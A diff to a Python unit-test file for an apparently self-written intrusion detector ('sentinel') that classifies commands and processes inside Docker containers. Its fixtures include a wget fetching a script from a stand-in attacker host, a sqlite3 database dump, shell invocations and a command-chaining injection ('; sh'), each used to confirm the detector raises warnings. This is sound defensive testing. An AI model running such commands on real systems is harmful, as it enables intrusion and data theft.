@@ -49,27 +49,27 @@ class Exec(unittest.TestCase):
 
     def test_a_health_check_is_ignored(self):
         cmd = "wget --spider -q http://localhost:3000/api/v1/stories?timespan=Day&limit=1"
-        self.assertIsNone(sentinel.classify_exec("hackernews-app-1", cmd, self.HEALTH))
-        self.assertIsNone(sentinel.classify_exec("latchkey-relay", "/relay healthcheck", ["CMD", "/relay", "healthcheck"]))
+        self.assertIsNone(sentinel.classify_exec("hackernews-app-1", cmd))
+        self.assertIsNone(sentinel.classify_exec("latchkey-relay", "/relay healthcheck"))
 
     def test_the_deploys_caddy_commands_are_quiet(self):
         for cmd in ("caddy reload --config /etc/caddy/Caddyfile", "caddy validate --config /etc/caddy/Caddyfile"):
-            self.assertEqual(sentinel.classify_exec("caddy", cmd, []), sentinel.NOTICE)
+            self.assertEqual(sentinel.classify_exec("caddy", cmd), sentinel.NOTICE)
 
     def test_the_backup_is_quiet(self):
         cmd = "sqlite3 /data/hackernews.db .backup '/tmp/hackernews-backup.db'"
-        self.assertEqual(sentinel.classify_exec("hackernews-app-1", cmd, self.HEALTH), sentinel.NOTICE)
+        self.assertEqual(sentinel.classify_exec("hackernews-app-1", cmd), sentinel.NOTICE)
 
     def test_a_shell_is_a_warning(self):
-        self.assertEqual(sentinel.classify_exec("hackernews-app-1", "sh", self.HEALTH), sentinel.WARNING)
-        self.assertEqual(sentinel.classify_exec("caddy", "sh -c id", []), sentinel.WARNING)
+        self.assertEqual(sentinel.classify_exec("hackernews-app-1", "sh"), sentinel.WARNING)
+        self.assertEqual(sentinel.classify_exec("caddy", "sh -c id"), sentinel.WARNING)
 
     def test_a_command_in_the_relay_is_a_warning(self):
         # Operator commands are rare and worth an email; anything else there is an intrusion.
-        self.assertEqual(sentinel.classify_exec("latchkey-relay", "/relay account list", ["CMD", "/relay", "healthcheck"]), sentinel.WARNING)
+        self.assertEqual(sentinel.classify_exec("latchkey-relay", "/relay account list"), sentinel.WARNING)
 
     def test_a_caddy_command_with_more_is_a_warning(self):
-        self.assertEqual(sentinel.classify_exec("caddy", "caddy reload --config /etc/caddy/Caddyfile; sh", []), sentinel.WARNING)
+        self.assertEqual(sentinel.classify_exec("caddy", "caddy reload --config /etc/caddy/Caddyfile; sh"), sentinel.WARNING)
 
 
 class Containers(unittest.TestCase):
@@ -140,13 +140,30 @@ class Containers(unittest.TestCase):
         # runs sqlite3 the same way. They count by their exact command lines only.
         health = ("wget", "wget --spider -q http://localhost:3000/api/v1/stories?timespan=Day&limit=1")
         backup = ("sqlite3", "sqlite3 /data/hackernews.db .backup '/tmp/hackernews-backup.db'")
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, health, backup], self.HN_HEALTH), [])
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, health, backup]), [])
 
     def test_a_tool_named_like_the_health_check_is_still_reported(self):
         # A process can take any name: wget or sqlite3 doing anything else is foreign.
         procs = [self.NODE, ("wget", "wget -qO- http://attacker.example/x.sh"), ("sqlite3", "sqlite3 /data/hackernews.db .dump")]
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", procs, self.HN_HEALTH), ["sqlite3", "wget"])
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, ("sh", "sh")], self.HN_HEALTH), ["sh"])
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", procs), ["sqlite3", "wget"])
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, ("sh", "sh")]), ["sh"])
+
+    def test_an_unknown_container_has_every_process_reported(self):
+        # Even one running a known container's health check: only known containers get exemptions.
+        health = ("wget", sentinel.HEALTH_CHECKS["hackernews-app-1"])
+        self.assertEqual(sentinel.unexpected_programs("miner", [("wget", health[1]), ("node", "node x")]), ["node", "wget"])
+        self.assertEqual(sentinel.classify_exec("miner", sentinel.HEALTH_CHECKS["hackernews-app-1"]), sentinel.WARNING)
+
+    def test_the_fixed_health_checks_are_the_ones_this_repository_defines(self):
+        root = os.path.join(HERE, "..", "..")
+        with open(os.path.join(root, "deploy", "server", "host", "hackernews-compose.yml")) as f:
+            compose = f.read()
+        want = '["CMD", ' + ", ".join(f'"{w}"' for w in sentinel.HEALTH_CHECKS["hackernews-app-1"].split()) + "]"
+        self.assertIn(want, compose)
+        with open(os.path.join(root, "relay", "Dockerfile")) as f:
+            dockerfile = f.read()
+        self.assertIn('CMD ["/relay", "healthcheck"]', dockerfile)
+        self.assertEqual(sentinel.HEALTH_CHECKS["latchkey-relay"], "/relay healthcheck")
 
 
 class Audit(unittest.TestCase):
